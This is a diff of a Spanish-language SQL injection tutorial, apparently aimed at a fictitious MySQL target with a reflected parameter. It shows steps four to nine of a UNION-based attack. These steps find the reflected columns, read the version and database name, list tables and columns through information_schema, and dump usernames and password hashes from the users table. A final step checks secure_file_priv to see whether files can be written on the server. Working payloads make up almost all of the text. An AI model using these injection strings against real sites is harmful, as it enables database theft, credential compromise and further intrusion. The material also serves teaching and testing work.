@@ -158,23 +158,20 @@ Objetivo ficticio, parámetro reflejado, MySQL. Los pasos 4 en adelante llevan `
 4. ?id=1' AND 1=2 UNION SELECT 1,2,3-- -     → imprime "2" y "3" → útiles la 2 y la 3
 
 5. ?id=1' AND 1=2 UNION SELECT NULL,@@version,database()-- -
-   → 8.0.35 · appdb
 
 6. ?id=1' AND 1=2 UNION SELECT NULL,table_name,NULL
-      FROM information_schema.tables WHERE table_schema='appdb'-- -
-   → users, sessions, logs
+      FROM information_schema.tables 
+      WHERE table_schema='appdb'-- -
 
 7. ?id=1' AND 1=2 UNION SELECT NULL,column_name,NULL
-      FROM information_schema.columns WHERE table_name='users'-- -
-   → id, username, password, email
+      FROM information_schema.columns 
+      WHERE table_schema='appdb' and table_name='users'-- -
 
 8. ?id=1' AND 1=2 UNION SELECT NULL,username,password FROM users-- -
-   → admin · $2y$10$...
 
 9. ?id=1' AND 1=2 UNION SELECT NULL,variable_value,NULL
       FROM information_schema.global_variables
       WHERE variable_name='secure_file_priv'-- -
-   → vacío: se puede escribir en cualquier lado
 ```
 
 ## Errores frecuentes y qué significan
